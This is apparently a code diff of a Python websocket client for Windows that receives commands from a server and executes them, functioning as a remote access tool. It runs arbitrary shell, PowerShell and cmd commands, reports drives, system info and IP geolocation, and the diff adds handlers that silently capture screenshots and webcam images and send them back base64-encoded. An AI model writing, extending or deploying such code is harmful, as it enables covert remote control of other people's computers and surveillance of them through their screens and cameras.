@@ -1,35 +1,37 @@
 import asyncio
+import base64
 import ctypes
 import json
 import os
 import platform
 import subprocess
-import time
 import urllib.request
 from datetime import datetime
-from subprocess import STDOUT, check_output
-
-import chardet
-import websockets
+from io import BytesIO
 from pprint import pprint
+from subprocess import STDOUT, check_output
+import chardet
+import pyautogui
+import websockets
+import cv2
+from PIL import Image
+import webbrowser
 
+import commands
 
 user32 = ctypes.WinDLL('user32')
 kernel32 = ctypes.WinDLL('kernel32')
+# Convert Image to Base64
+def im_2_b64(image):
+    buff = BytesIO()
+    image.save(buff, format="JPEG")
+    img_str = base64.b64encode(buff.getvalue())
+    return img_str.decode("ascii")
 
-def force_decode(string, codecs=['utf8', 'cp1252', 'ASCII']):
-    for i in codecs:
-        try:
-            return string.decode(i)
-        except:
-            pass
-
-
-async def test():
-    print("Start Test")
+async def client():
+    # print("Start Test")
     try:
         print("Trying to connect...")
-        #async with websockets.connect('ws://10.0.0.234:8000') as websocket:
         async with websockets.connect('ws://127.0.0.1:8000') as websocket:
             timestamp = str(datetime.now())
             print(f"Sending hello timestamp {timestamp}")
@@ -56,12 +58,53 @@ async def test():
                 print(f"Command to execute: {str(args)}")
 
                 status = "OK"
+                output_type = "TEXT"
                 output = []
 
-                if request == 'SHELL':
+                # Powershell command
+                if request in commands.ps:
+                    try:
+                        # execut powershell as subprocess so that the websocket communication
+                        # will not time out for long requests
+                        proc = await asyncio.create_subprocess_exec(
+                            "powershell.exe", commands.ps[request],
+                            stdout=asyncio.subprocess.PIPE,
+                            stderr=asyncio.subprocess.PIPE
+                        )
+                        # if proc takes very long to complete, the CPUs are free to use cycles for
+                        # other processes
+                        stdout, stderr = await asyncio.wait_for(proc.communicate(), 5)
+                        encoding = chardet.detect(stdout)['encoding']
+                        output.append(stdout.decode(encoding, 'ignore'))
+                    except Exception as e:
+                        status = "ERROR"
+                        output.append(str("-1"))
+                        output.append(str(e))
+
+                # Shell command
+                elif request in commands.cmd:
+                    try:
+                        # execut powershell as subprocess so that the websocket communication
+                        # will not time out for long requests
+
+                        proc = await asyncio.create_subprocess_exec(
+                            "cmd.exe","/C", commands.cmd[request],
+                            stdout=asyncio.subprocess.PIPE,
+                            stderr=asyncio.subprocess.PIPE)
+
+                        # if proc takes very long to complete, the CPUs are free to use cycles for
+                        # other processes
+                        stdout, stderr = await asyncio.wait_for(proc.communicate(), 5)
+                        encoding = chardet.detect(stdout)['encoding']
+                        output.append(stdout.decode(encoding, 'ignore'))
+                    except Exception as e:
+                        status = "ERROR"
+                        output.append(str("-1"))
+                        output.append(str(e))
+                elif request == 'SHELL':
                     # Send command and arguments to shell
                     try:
-                        ret = check_output(args, stderr=STDOUT, timeout=5, shell=True)
+                        ret = check_output(args, stderr=STDOUT, timeout=500, shell=True)
                         the_encoding = chardet.detect(ret)['encoding']
                         output.append(ret.decode(the_encoding, 'ignore'))
                     except subprocess.CalledProcessError as e:
@@ -83,23 +126,10 @@ async def test():
                         output.append(str("-1"))
                         output.append(str(e))
 
-                elif request == "GET_MONITORS":
-                    # get number of used monitors
-                    try:
-                        p = await subprocess.check_output(["powershell.exe",
-                                                     "Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorBasicDisplayParams"],
-                                                    encoding='utf-8', timeout=5)
-                        output.append(p)
-                    except Exception as e:
-                        status = "ERROR"
-                        output.append(str("-1"))
-                        output.append(str(e))
-
                 elif request == "GET_LOCATION":
                     # Get geolocation and
                     try:
                         # with urllib.request.urlopen("https://geolocation-db.com/json") as url:
-
                         with urllib.request.urlopen("http://ip-api.com/json/") as url:
                             data = json.loads(url.read().decode())
 
@@ -146,48 +176,6 @@ async def test():
                         status = "ERROR"
                         output.append(str("-1"))
                         output.append(str(e))
-                elif request == "GET_NETSTAT":
-                    # get number of used monitors
-                    try:
-                        p = subprocess.check_output(["powershell.exe", "Get-NetTCPConnection -State Listen"],
-                                                    encoding='utf-8', timeout=5)
-                        output.append(p)
-                    except Exception as e:
-                        status = "ERROR"
-                        output.append(str("-1"))
-                        output.append(str(e))
-                elif request == "GET_ROUTING":
-                    # get number of used monitors
-                    try:
-                        ret = check_output(["netstat", "-nr"], stderr=STDOUT, timeout=5, shell=True)
-                        the_encoding = chardet.detect(ret)['encoding']
-                        output.append(ret.decode(the_encoding, 'ignore'))
-                    except Exception as e:
-                        status = "ERROR"
-                        output.append(str("-1"))
-                        output.append(str(e))
-                elif request == "GET_TASKS":
-                    # List all tasks
-                    try:
-                        p = subprocess.check_output(["powershell.exe", "Get-Process"],
-                                                    encoding='utf-8', timeout=5)
-                        output.append(p)
-                    except Exception as e:
-                        status = "ERROR"
-                        output.append(str("-1"))
-                        output.append(str(e))
-                elif request == "GET_WINDOWS":
-                    # get number of used monitors
-                    try:
-                        p = subprocess.check_output(["powershell.exe",
-                                                     "Get-Process | Where-Object {$_.mainWindowTitle} | Format-Table Id, Name, mainWindowtitle -AutoSize"],
-                                                    encoding='utf-8', timeout=5)
-                        output.append(p)
-                    except Exception as e:
-                        status = "ERROR"
-                        output.append(str("-1"))
-                        output.append(str(e))
-
                 elif request == 'GET_DRIVES':
                     # list all availible drive letters
                     try:
@@ -199,6 +187,41 @@ async def test():
                                 output.append(chr(letter) + ':\\')
                             bitmask >>= 1
                             letter += 1
+                    except Exception as e:
+                        status = "ERROR"
+                        output.append(str("-1"))
+                        output.append(str(e))
+                elif request == "OPEN_URL":
+                    try:
+                        webbrowser.open_new_tab(args[0])
+                        output.append(str("Sent open to lokal browser."))
+                    except Exception as e:
+                        status = "ERROR"
+                        output.append(str("-1"))
+                        output.append(str(e))
+                elif request == 'SCREENSHOT':
+                    # list all availible drive letters
+                    try:
+                        image=pyautogui.screenshot()
+                        tmp=im_2_b64(image)
+                        output.append(tmp)
+                        output_type = "IMAGE"
+                    except Exception as e:
+                        status = "ERROR"
+                        output.append(str("-1"))
+                        output.append(str(e))
+                elif request == 'WEBCAM_SNAPSHOT':
+                    # list all availible drive letters
+                    try:
+                        cam = cv2.VideoCapture(0,cv2.CAP_DSHOW)
+                        return_value, cam_image = cam.read()
+
+                        # convert from openCV2 to PIL. Notice the COLOR_BGR2RGB which means that
+                        # the color is converted from BGR to RGB
+                        image = Image.fromarray(cv2.cvtColor(cam_image, cv2.COLOR_BGR2RGB))
+                        cam.release()
+                        output.append(im_2_b64(image))
+                        output_type = "IMAGE"
                     except Exception as e:
                         status = "ERROR"
                         output.append(str("-1"))
@@ -215,7 +238,6 @@ async def test():
                         status = "ERROR"
                         output.append(str("-1"))
                         output.append(str(e))
-
                 elif request == 'SYSINFO':
                     output.append(f'''System: {platform.platform()} {platform.win32_edition()}''')
                     output.append(f'''Architecture: {platform.architecture()}''')
@@ -225,7 +247,8 @@ async def test():
                     output.append(f'''Java: {platform.java_ver()}''')
                     output.append(f'''User: {os.getlogin()}''')
                 elif request == 'EXIT':
-                    exit(1)
+                    return
+                    # exit(1)
                 else:
                     request = f"Internal Error: Unknown command {request}"
 
@@ -233,6 +256,7 @@ async def test():
                 # print(type(output))
                 answer = []
                 answer.append(status)
+                answer.append(output_type)
                 answer.append(output)
                 answer_json = json.dumps(answer)
                 # print(f'Command: {answer_json}')
@@ -243,4 +267,4 @@ async def test():
         print(f'Exception: {e}')
 
 while True:
-    asyncio.get_event_loop().run_until_complete(test())
+    asyncio.get_event_loop().run_until_complete(client())
